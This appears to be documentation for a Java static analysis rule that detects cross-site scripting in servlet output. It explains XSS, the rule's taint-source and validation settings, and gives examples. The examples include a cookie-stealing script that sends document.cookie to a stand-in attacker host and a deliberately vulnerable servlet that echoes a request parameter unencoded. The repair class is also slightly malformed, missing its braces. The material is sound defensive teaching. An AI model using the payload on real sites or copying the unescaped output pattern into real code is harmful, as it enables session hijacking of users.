DESCRIPTION
</STRONG>
<PRE>
This rule detects cases of possible XSS vulnerabilities.

This rule triggers when tainted data is passed to the following methods:

javax.servlet.ServletOutputStream
   * void print(...) methods
   * void println(...) methods
   * void write(...) methods

java.io.PrintWriter
   * void print(...) methods
   * void println(...) methods
   * void write(...) methods

category: Input-Based Attacks

Cross-site scripting (XSS) is a type of attack that makes a web site show attacker-provided
executable code, which is loaded in the user's browser. Such code can be written e.g. inHTML/JavaScript,
VBScript, ActiveX, Java or Flash.

When such code is executed in the user's browser, it is run within the security
context (or zone) of the hosting web site. As a result, it will receive privileges far
beyond what it should have, which may enable an attacker to read, modify, and transmit
any sensitive data the browser can access. As a result, users may have their browsers
redirected to another location that will look exactly like the original one, but will
be used to hijack (steal cookies from) their account or steal login / password information.

There are two types of cross-site scripting attacks: non-persistent and persistent.
Non-persistent attacks require a user to visit a specially-crafted link that is laced with
malicious code. The code embedded in the URL will be echoed and executed in the user's web browser.
Persistent attacks occur when malicious code is submitted to a website and stored for a period of time.
The attack is launched upon viewing the web page that contains the code and does not require the user
to click any link.

PARAMETERS
</STRONG>
<PRE>
The "Sources of tainted data" parameter allows you to specify which data
sources the rule considers to be sources of tainted data. You can specify
the following sources:
   * Servlet requests
   * Files
   * Pipes
   * Return values of remote methods
   * Reflection methods
   * Environment variables and system properties
   * Spring environment properties
   * JMS (Java Message Service)
   * Database
   * Stream-oriented APIs (streams, readers and channels)
   * Console
   * GUI controls
   * Parameters of entry point methods
   * Parameters of remote methods
   * Native methods
   * Non-validating Struts forms
   * Network
   * Sockets
   * Spring http requests

The "Validating methods" parameter allows you to specify methods that can
validate tainted data. The rule assumes that parameters, target objects, and
return values are benign if one of the validating methods is called. 
Fill in the following columns to configure a validating method and specify
the data it affects.
- "Enabled" - enables or disables the validating method. If disabled, the rule
    does not consider the method to be a validating method.
- "Fully qualified type name (wildcard)" - specifies the fully qualified name
    of the type that declares the method. You can use "*" for a method declared
    in any type.
- "Method name (wildcard)" - specifies the name of the method.
- "+ definitions in subclasses" - if enabled, the information configured in
    the current row applies to methods with the specified name that are defined
    in subclasses of the given class. Note that this applies to both instance
    and non-instance methods.
- "'this' object is validated" - if enabled,  the method cleans the object it
    is called on.
- "Returns validated data" - if enabled, the method cleans its return value.
- "Validated parameters" - specifies which method parameters are cleaned by
    the method. List 1-based indexes of parameters separated by a comma or
    use "*" to specify that all method parameters are cleaned.

The "Do not consider numerical data tainted" parameter allows you to specify
how the rule treats numerical data. If enabled, the rule assumes that numerical
data (both primitive data types and objects) is never tainted, even if it
comes from an untrusted source.

The "Report unvalidated violations" parameter allows you to enable or disable
reporting unvalidated violations. If enabled, Flow  Analysis does not check
whether the path of the violation can be reached from the beginning of
the function. Enabling this parameter may be useful in complex cases when
restricted analysis depth prevents Flow Analysis from completing the violation
validation procedure, but it may result in reporting false positives.

EXAMPLE
</STRONG>
<PRE>
Persistent Attack:

Consider a web site hosting a bulletin board or forum where users can post
messages. Any registered (and logged) user is commonly tracked using some session
ID (stored in cookies) that is used to authorize him to post messages.
If an attacker posts a message with specially-designed JavaScript
code, then any registered user reading this post could have his cookie (with his
account information and session ID) stolen.

For example, the following code can be used to steal cookie information:

&lt;SCRIPT&gt;
document.location= '<A HREF="http://attackerhost.example/cgi-bin/cookiesteal.cgi?'+document.cookie">http://attackerhost.example/cgi-bin/cookiesteal.cgi?'+document.cookie</A>
&lt;/SCRIPT&gt;

Non-Persistent Attack:

Many different web sites (for instance, web portals) greet a logged in user with
"Welcome, [name]". Sometimes, the data referencing a logged in user are stored within
the query string of a URL and echoed to the screen.

Portal URL example:

<A HREF="http://portal.example/index.php?sessionid=12312312&amp;username=Joe">http://portal.example/index.php?sessionid=12312312&amp;username=Joe</A>

In the example above, we see that the username "Joe" is stored in the URL. The
resulting web page displays a "Welcome, Joe" message. If an attacker modifies
the username parameter in the URL, inserting a cookie-stealing JavaScript, it
would be possible to gain control of the user's account.

Many people will be suspicious if they see JavaScript embedded
in a URL, so most of the time an attacker will URL Encode their malicious payload.

As a result, the decoded string contains script that steals the user's cookie
just at the moment the page is shown to the user.

A Web application (servlet) with the following request-processing method
can be successfully attacked:

import java.io.IOException;
import javax.servlet.ServletException;
import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class Example
    extends HttpServlet
{
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp)
        throws ServletException, IOException
    {
        ServletOutputStream response = resp.getOutputStream();
        String sUserName = req.getParameter("username");
        response.print("Welcome, ");
        response.print(sUserName); // VIOLATION
        response.print("\n");
        response.flush();
    }
}

It is necessary to validate data prior to their use:

import java.io.IOException;
import javax.servlet.ServletException;
import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public abstract class Repair

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp)
        throws ServletException, IOException
    {
        ServletOutputStream response = resp.getOutputStream();
        String sUserName = validate(req.getParameter("username"));
        response.print("Welcome, ");
        response.print(sUserName); // NO VIOLATION
        response.print("\n");
        response.flush();
    }

    public abstract String validate(Object obj);
